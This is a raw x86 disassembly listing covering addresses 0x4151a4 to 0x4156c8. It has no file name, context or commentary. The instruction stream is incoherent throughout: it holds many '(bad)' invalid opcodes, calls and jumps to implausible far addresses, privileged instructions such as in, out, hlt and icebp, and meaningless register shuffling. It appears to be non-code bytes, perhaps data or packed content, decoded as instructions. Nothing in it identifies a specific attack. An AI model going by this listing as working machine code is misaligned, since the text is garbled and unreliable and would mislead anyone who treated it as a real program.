  4151a4:	mov    ecx,DWORD PTR [esp+edx*2]
  4151a7:	rol    DWORD PTR [ebp+0x45],0x8b
  4151ab:	mov    edi,esp
  4151ad:	lock (bad) 
  4151af:	dec    ebp
  4151b0:	ret    
  4151b1:	mov    eax,DWORD PTR [ebp+0x10]
  4151b4:	mov    eax,DWORD PTR [ecx-0x4]
  4151b7:	mov    eax,edi
  4151b9:	fadd   st,st(3)
  4151bb:	enter  0x1645,0x8b
  4151bf:	inc    ebp
  4151c0:	cld    
  4151c1:	mov    ecx,DWORD PTR [ebp+0xc]
  4151c4:	xor    ecx,DWORD PTR [ebp+0x3]
  4151c7:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  4151cd:	sub    eax,DWORD PTR [ebp-0x17]
  4151d0:	xor    eax,DWORD PTR [edx]
  4151d2:	pushf  
  4151d3:	add    bh,al
  4151d5:	or     al,0xd8
  4151d7:	jne    0x41515e
  4151d9:	(bad)  
  4151da:	clc    
  4151db:	mov    al,0x45
  4151dd:	call   0xffde481f
  4151e2:	jmp    0xdd5518
  4151e7:	mov    DWORD PTR [ebp-0x30],eax
  4151ea:	xor    eax,DWORD PTR [ebp+0x3]
  4151ed:	xor    BYTE PTR [ecx+0x45c7f49c],cl
  4151f3:	enter  0x8503,0xc
  4151f7:	clc    
  4151f8:	inc    ebp
  4151f9:	inc    ebp
  4151fa:	push   DWORD PTR [edx]
  4151fc:	in     al,dx
  4151fd:	pushf  
  4151fe:	jne    0x41518d
  415200:	mov    edx,eax
  415202:	clc    
  415203:	dec    ebp
  415204:	out    dx,eax
  415205:	(bad)  
  415206:	dec    esp
  415208:	mov    DWORD PTR [ebp-0x10],ecx
  41520b:	lea    eax,[ebp-0x38]
  41520e:	cmp    DWORD PTR [ebp-0x64],ecx
  415211:	lea    ecx,[ebx-0x38b2273c]
  415217:	mov    eax,ebx
  415219:	cld    
  41521a:	(bad)  
  41521b:	iret   
  41521c:	mov    esp,0xf74de8cb
  415221:	jmp    0x865425
  415226:	test   DWORD PTR [ebx],esi
  415228:	je     0x4151c6
  41522a:	mov    ecx,DWORD PTR [edi]
  41522c:	fdivr  st,st(6)
  41522e:	mov    DWORD PTR [eax],0xe8ff8bc3
  415234:	lock iret 
  415236:	inc    ebp
  415237:	lock push eax
  415239:	retf   
  41523a:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  415241:	test   DWORD PTR [ebp-0x7c],0x32d89c8b
  415248:	dec    ebp
  415249:	mov    DWORD PTR [ebx],ebp
  41524b:	fmul   DWORD PTR [ecx+0x458bd845]
  415251:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  415257:	enter  0x1303,0xc
  41525b:	inc    ebp
  41525c:	dec    ebp
  41525d:	xor    edi,DWORD PTR [ebx]
  41525f:	add    esi,DWORD PTR [edx+0x50]
  415262:	mov    ecx,DWORD PTR [eax+esi*8]
  415265:	inc    ebp
  415266:	inc    eax
  415267:	push   eax
  415268:	mov    ebp,esp
  41526a:	lock inc DWORD PTR [ecx-0x75]
  41526e:	mov    esp,esp
  415270:	fadd   DWORD PTR [eax]
  415272:	rol    edi,0xee
  415275:	test   BYTE PTR [eax],al
  415277:	dec    esp
  415278:	push   0x32
  41527a:	dec    DWORD PTR [ebx-0x30ba0314]
  415280:	push   eax
  415281:	mov    dh,0x21
  415283:	add    edi,edi
  415285:	cmp    edi,DWORD PTR [eax-0x7877af1]
  41528b:	add    BYTE PTR [ebp-0x75],al
  41528e:	(bad)  
  41528f:	loopne 0x41525d
  415291:	add    BYTE PTR [ebp+0x4584f8c7],al
  415297:	dec    esp
  415298:	xor    esi,DWORD PTR [edx]
  41529a:	pushf  
  41529b:	mov    eax,edi
  41529d:	cld    
  41529e:	(bad)  
  41529f:	iret   
  4152a0:	test   DWORD PTR [esi+0x3b4d03f8],esi
  4152a6:	mov    DWORD PTR [edi],ecx
  4152a8:	in     al,0x58
  4152aa:	dec    ebp
  4152ab:	add    BYTE PTR [ecx+0x4df0e08b],cl
  4152b1:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  4152b7:	dec    esp
  4152b8:	mov    DWORD PTR [edx],esi
  4152ba:	fmul   QWORD PTR [ebx-0x30cc03b3]
  4152c0:	add    esi,DWORD PTR [esi+0x3bd80389]
  4152c6:	test   DWORD PTR [edi],0x3d3800
  4152cc:	test   DWORD PTR [ebx+0x84dcf8],ecx
  4152d2:	add    edi,eax
  4152d4:	add    BYTE PTR [ebp+ecx*2-0x74cdccb4],al
  4152db:	mov    eax,DWORD PTR [ebx]
  4152dd:	cld    
  4152de:	mov    edi,ecx
  4152e0:	hlt    
  4152e1:	mov    dh,0x45
  4152e3:	add    esi,DWORD PTR [ebx]
  4152e5:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  4152eb:	add    BYTE PTR [eax],al
  4152ed:	mov    eax,DWORD PTR [ebp-0x20]
  4152f0:	mov    eax,DWORD PTR [eax]
  4152f2:	call   0x33c5a0be
  4152f7:	dec    esp
  4152f8:	add    esi,DWORD PTR [edx]
  4152fa:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  415300:	cld    
  415301:	iret   
  415302:	(bad)  
  415303:	mov    ebx,es
  415305:	dec    esp
  415306:	push   0x32
  415308:	lea    esi,[edx]
  41530a:	mov    al,0x8b
  41530c:	call   0xff4b4e01
  415311:	iret   
  415312:	inc    ebp
  415313:	mov    WORD PTR [ebx-0x75cdccb4],cs
  415319:	or     al,BYTE PTR ds:0xe4728b
  41531f:	or     DWORD PTR [ebp-0x31],ecx
  415322:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb0]
  415329:	cmp    al,cl
  41532b:	je     0x415505
  415331:	mov    eax,DWORD PTR [ebp-0x10]
  415334:	mov    eax,DWORD PTR [eax]
  415336:	xor    eax,edi
  415338:	mov    al,BYTE PTR [ebp+eax*1+0x32724c]
  41533f:	mov    ecx,DWORD PTR [ebp-0x20]
  415342:	xor    ecx,DWORD PTR [ecx]
  415344:	bswap  edi
  415346:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb4],0x32
  41534e:	add    DWORD PTR [ebx+0x945dc00],ecx
  415354:	mov    ecx,edi
  415356:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41535d:	or     al,BYTE PTR [eax]
  41535f:	mov    ecx,DWORD PTR [ebp-0x20]
  415362:	xor    ecx,DWORD PTR [ecx]
  415364:	bswap  edi
  415366:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb0],0x3a
  41536e:	add    DWORD PTR [edi],ecx
  415370:	add    BYTE PTR [eax-0x7474ffbb],dl
  415376:	xor    ebx,esp
  415378:	mov    al,BYTE PTR [eax]
  41537a:	add    eax,0x8472c7
  41537f:	dec    esp
  415380:	dec    ebp
  415381:	xor    dh,BYTE PTR [ebx]
  415383:	mov    ecx,DWORD PTR [edi]
  415385:	lock ror BYTE PTR [ecx],0xcb
  415389:	iret   
  41538a:	ror    DWORD PTR [esp+eax*4+0x32014c],0x32
  415392:	inc    ebp
  415393:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  415399:	iret   
  41539a:	add    eax,0x4c728c
  41539f:	xor    cl,BYTE PTR [ebp+0xa]
  4153a2:	mov    ecx,DWORD PTR [ebx+0x98af033]
  4153a8:	or     eax,0x8c72cf
  4153ad:	push   eax
  4153ae:	shl    DWORD PTR [edx],0x4d
  4153b1:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  4153b7:	fmul   QWORD PTR ds:0xc77200
  4153bd:	test   cl,al
  4153bf:	dec    esp
  4153c0:	dec    ebp
  4153c1:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  4153c7:	or     DWORD PTR ds:0x8c72cf,ecx
  4153cd:	dec    esp
  4153ce:	enter  0x8532,0x32
  4153d2:	add    BYTE PTR [ebx+0x945e000],cl
  4153d8:	mov    ecx,edi
  4153da:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  4153e1:	or     al,BYTE PTR [eax]
  4153e3:	mov    ecx,DWORD PTR [ebp-0x24]
  4153e6:	mov    ecx,DWORD PTR [ecx]
  4153e8:	xor    ecx,edi
  4153ea:	mov    cl,BYTE PTR [ebp+ecx*1+0x327250]
  4153f1:	cmp    al,cl
  4153f3:	jne    0x415442
  4153f5:	lea    ecx,[ebx-0x7517cc50]
  4153fb:	sti    
  4153fc:	or     eax,0x4d72ff
  415401:	cmp    eax,ecx
  415403:	je     0x415452
  415405:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  41540b:	ret    
  41540c:	or     eax,0x8b7245
  415411:	call   0x84c71bde
  415416:	add    BYTE PTR [eax+eax*1-0x74ccbace],bl
  41541d:	mov    esi,DWORD PTR [ebx]
  41541f:	cld    
  415420:	mov    dl,BYTE PTR [ebp+0x5]
  415423:	xor    esi,DWORD PTR [edx+0x3]
  415426:	add    BYTE PTR [ebx],bh
  415428:	dec    ebp
  415429:	jnp    0x8b408826
  41542f:	mov    ecx,DWORD PTR ds:0x4d72fc
  415435:	xor    eax,ecx
  415437:	add    ecx,DWORD PTR [ebp+0x3b]
  41543a:	mov    esi,DWORD PTR [ebp+0x33]
  41543d:	mov    ecx,DWORD PTR [edx+0x724d0de8]
  415443:	xor    eax,DWORD PTR [eax]
  415445:	(bad)  
  415446:	ror    DWORD PTR [eax],0x4d
  415449:	jb     0x4153d6
  41544b:	add    BYTE PTR [ebx],dh
  41544d:	ja     0x4153d9
  41544f:	sbb    BYTE PTR ds:0x8d7275,cl
  415455:	cwde   
  415456:	enter  0x50e8,0xf3
  41545a:	inc    ebp
  41545b:	dec    DWORD PTR [ebx-0x7574ccbb]
  415461:	fadd   DWORD PTR ds:0xc372c7
  415467:	ror    DWORD PTR [ebp+0x13],0x8b
  41546b:	inc    ebp
  41546c:	xor    esi,DWORD PTR [ebx]
  41546e:	mov    al,BYTE PTR [ebx]
  415470:	or     eax,0x187250
  415475:	inc    ebp
  415476:	rcl    DWORD PTR [eax+0x4d],0xdc
  41547a:	mov    edi,edi
  41547c:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  415482:	jb     0x41540d
  415484:	add    ah,bl
  415486:	shl    DWORD PTR [ebp+0x4d],0xff
  41548a:	mov    ebx,esp
  41548c:	xor    eax,DWORD PTR [ebp-0x76]
  41548f:	add    ecx,DWORD PTR ds:0xe87208
  415495:	repz enter 0x10ff,0x45
  41549a:	inc    ebp
  41549b:	mov    edx,DWORD PTR [eax-0x28]
  41549e:	xor    bh,al
  4154a0:	inc    ebx
  4154a2:	mov    eax,ecx
  4154a4:	mov    eax,0xa00c111
  4154a9:	jne    0x4154f0
  4154ab:	mov    esi,DWORD PTR [ebx]
  4154ad:	test   al,0x3
  4154af:	inc    ebp
  4154b0:	mov    DWORD PTR [eax-0xc],edx
  4154b3:	mov    ds:0x8b33ff45,al
  4154b8:	lea    edx,[eax]
  4154ba:	xor    BYTE PTR [ebp+0x72],cl
  4154bd:	add    DWORD PTR [eax],eax
  4154bf:	mov    eax,edi
  4154c1:	lods   al,BYTE PTR ds:[esi]
  4154c2:	dec    ebp
  4154c3:	inc    ebp
  4154c4:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  4154ca:	retf   
  4154cb:	mov    edx,ecx
  4154cd:	adc    al,0x84
  4154cf:	(bad)  
  4154d0:	std    
  4154d1:	ret    
  4154d2:	jmp    FWORD PTR [edi-0x37474bb]
  4154d8:	hlt    
  4154d9:	push   ebp
  4154da:	(bad)  
  4154db:	xor    eax,ebx
  4154dd:	(bad)  
  4154de:	enter  0x1111,0x72
  4154e2:	inc    ebp
  4154e3:	add    BYTE PTR [ebx-0x387deb3f],cl
  4154e9:	cld    
  4154ea:	test   bh,bh
  4154ec:	pushf  
  4154ed:	inc    ebp
  4154ee:	xor    bl,BYTE PTR [edi-0x15]
  4154f1:	pop    ebx
  4154f2:	push   0xffffffc2
  4154f4:	inc    DWORD PTR [eax]
  4154f6:	in     al,dx
  4154f7:	mov    eax,DWORD PTR [ebp+0x51]
  4154fa:	push   eax
  4154fb:	inc    ebp
  4154fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154fd:	mov    edi,edi
  4154ff:	or     BYTE PTR [ebx+0x4d80fc16],cl
  415505:	add    DWORD PTR [ebx],esi
  415507:	add    BYTE PTR [ebx],al
  415509:	add    BYTE PTR [ebx],bh
  41550b:	icebp  
  41550c:	je     0x415516
  41550e:	mov    eax,DWORD PTR [edi]
  415510:	cld    
  415511:	rol    edi,0x72
  415514:	ret    
  415515:	add    BYTE PTR [edx-0x2f],ch
  415518:	lea    edx,[eax]
  41551a:	cwde   
  41551b:	jne    0x415505
  41551d:	(bad)  
  41551e:	clc    
  41551f:	or     al,0xff
  415521:	inc    DWORD PTR [ebp-0x18]
  415524:	cmp    ebx,0x18
  415527:	inc    DWORD PTR [ebp+0x6]
  41552a:	call   FWORD PTR [ebp-0x54]
  41552d:	or     al,0x75
  41552f:	push   ebp
  415530:	mov    ebp,esp
  415532:	test   al,0x53
  415534:	inc    ebp
  415535:	mov    edx,DWORD PTR [eax-0x75]
  415538:	imul   ecx,DWORD PTR [eax],0xffffffff
  41553b:	dec    ebp
  41553c:	mov    edx,DWORD PTR [edi-0x4]
  41553f:	push   ebp
  415540:	dec    ebp
  415541:	push   ecx
  415542:	xor    esi,DWORD PTR [ebx]
  415544:	add    edi,DWORD PTR [edi+0x74723b]
  41554a:	push   0xffffffc7
  41554c:	inc    DWORD PTR [ecx]
  41554e:	lods   al,BYTE PTR ds:[esi]
  41554f:	inc    ebp
  415550:	inc    ebp
  415551:	mov    eax,DWORD PTR [ebx]
  415553:	xchg   esp,eax
  415554:	or     BYTE PTR [eax],al
  415556:	call   0xffcd4de6
  41555b:	adc    al,0x45
  41555d:	or     BYTE PTR [ebx+0x800ac01],0x0
  415564:	inc    ebp
  415565:	inc    ecx
  415566:	add    ecx,DWORD PTR [ebx-0x76baebec]
  41556c:	mov    eax,DWORD PTR [ecx]
  41556e:	call   0x338aa273
  415573:	push   0x3
  415575:	push   0xc1300f
  41557a:	dec    ebp
  41557b:	jo     0x415508
  41557d:	push   0xffffffd4
  41557f:	dec    edi
  415581:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf764],ecx
  415588:	cmp    eax,edi
  41558a:	cmovne edx,DWORD PTR [edi-0x75]
  41558e:	call   DWORD PTR [eax]
  415590:	mov    eax,DWORD PTR [ebp+0x8]
  415593:	call   FWORD PTR [esi+0x14]
  415596:	leave  
  415597:	inc    ebp
  415598:	adc    BYTE PTR [eax+0x55],dl
  41559b:	jne    0x415589
  41559d:	call   0xff52552d
  4155a2:	dec    ebp
  4155a3:	inc    ebp
  4155a4:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4155aa:	add    BYTE PTR [ebx],bh
  4155ac:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4155b0:	push   ebp
  4155b1:	or     al,0x51
  4155b3:	dec    ebp
  4155b4:	xor    DWORD PTR [ebx],0xf32039c
  4155ba:	cmp    eax,DWORD PTR [ebp+0x74]
  4155bd:	mov    edi,edi
  4155bf:	pop    edi
  4155c0:	adc    BYTE PTR [ebx+0x75],bl
  4155c3:	ret    0x50
  4155c6:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  4155ca:	(bad)  
  4155cb:	clc    
  4155cc:	mov    esp,ebp
  4155ce:	pop    ecx
  4155cf:	mov    ecx,0xf80085c2
  4155d4:	mov    ecx,DWORD PTR [ecx+edx*2]
  4155d7:	push   esi
  4155d8:	push   esi
  4155d9:	(bad)  
  4155da:	lock inc DWORD PTR [ebp+0x44]
  4155de:	mov    edx,DWORD PTR [eax]
  4155e0:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  4155e4:	or     BYTE PTR [ebp+0x7],dl
  4155e7:	push   ecx
  4155e8:	ret    
  4155e9:	xor    ebx,DWORD PTR [esi+edi*4+0x37232]
  4155f0:	mov    esi,edi
  4155f2:	mov    edi,DWORD PTR [esp+edx*1+0xc]
  4155f6:	cmp    BYTE PTR [ebp+0x1],0x89
  4155fa:	add    BYTE PTR [eax+ecx*1],ah
  4155fd:	cmp    DWORD PTR [ebp+0x10],eax
  415600:	mov    edx,DWORD PTR [esi]
  415602:	xchg   esp,eax
  415603:	dec    esp
  415604:	add    BYTE PTR [eax],dl
  415606:	mov    ecx,edx
  415608:	add    edx,DWORD PTR [esp+edi*1+0x8]
  41560c:	dec    ebp
  41560d:	into   
  41560e:	mov    ebp,DWORD PTR [edi+0x240089d8]
  415614:	mov    edx,DWORD PTR [eax+0x14]
  415617:	das    
  415618:	add    al,0x45
  41561a:	add    BYTE PTR [ebp+0x0],dh
  41561d:	mov    edi,edi
  41561f:	and    al,0x50
  415621:	mov    eax,DWORD PTR [eax]
  415623:	and    al,0xd1
  415625:	xor    eax,DWORD PTR [esi]
  415627:	lea    eax,[ebp+0x8]
  41562a:	xor    esi,DWORD PTR [edx+0x3]
  41562d:	add    BYTE PTR [ecx+0x4510fc44],cl
  415633:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  415639:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  415643:	xor    bh,bh
  415645:	pushf  
  415646:	mov    edi,edi
  415648:	or     BYTE PTR [esi+ecx*1],cl
  41564b:	jne    0x415610
  41564d:	call   0xa5619
  415652:	adc    BYTE PTR [ebp+eax*2+0xc],al
  415656:	mov    ebx,DWORD PTR [eax]
  415658:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  41565c:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  415664:	pop    esi
  415665:	dec    ecx
  415667:	and    al,0x10
  415669:	call   DWORD PTR [ebp+0x24]
  41566c:	in     al,dx
  41566d:	call   0xffc55556
  415672:	adc    BYTE PTR [ecx+esi*1+0xc],al
  415676:	pushf  
  415677:	pop    esi
  415678:	mov    ebp,esp
  41567a:	and    al,0xc2
  41567c:	push   edi
  41567d:	add    BYTE PTR [ecx+0x33],al
  415680:	mov    DWORD PTR [ebp+0x24],esi
  415683:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  415689:	dec    DWORD PTR [eax]
  41568b:	and    al,0x7
  41568d:	(bad)  
  41568e:	cli    
  41568f:	and    al,0x9c
  415691:	or     BYTE PTR [edx],dh
  415693:	sbb    BYTE PTR [ebx],al
  415695:	adc    al,0x89
  415697:	jmp    DWORD PTR [esp]
  41569a:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  4156a0:	adc    al,0x8
  4156a2:	dec    ebp
  4156a3:	adc    BYTE PTR [ebp-0x7c],dh
  4156a6:	mov    esi,DWORD PTR [edx]
  4156a8:	and    al,0x24
  4156aa:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  4156b0:	add    edi,eax
  4156b2:	pcmpeqb mm1,mm2
  4156b5:	jmp    0x415703
  4156b7:	dec    DWORD PTR [eax]
  4156b9:	je     0x4156a6
  4156bb:	mov    edi,DWORD PTR [ecx]
  4156bd:	pop    ebp
  4156be:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  4156c2:	pushf  
  4156c3:	mov    DWORD PTR [eax-0x8],ebp
  4156c6:	jge    0x415730
  4156c8:	dec    DWORD PTR [ecx+0x5fbf7424]
